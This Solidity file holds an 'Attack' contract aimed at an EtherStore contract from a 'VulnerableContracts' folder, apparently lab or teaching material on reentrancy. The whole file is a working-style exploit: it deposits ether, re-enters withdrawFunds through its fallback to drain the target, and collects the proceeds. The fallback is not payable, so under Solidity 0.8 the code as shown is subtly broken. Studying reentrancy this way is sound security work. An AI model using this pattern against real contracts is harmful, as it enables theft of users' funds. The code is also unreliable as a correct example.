//SPDX-License-Identifier: CC-BY-4.0

pragma solidity ^0.8.0;

import "../VulnerableContracts/EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // initialise the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function pwnEtherStore() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        etherStore.depositFunds();
        // start the magic
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // fallback function - where the magic happens
    fallback() external {
        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
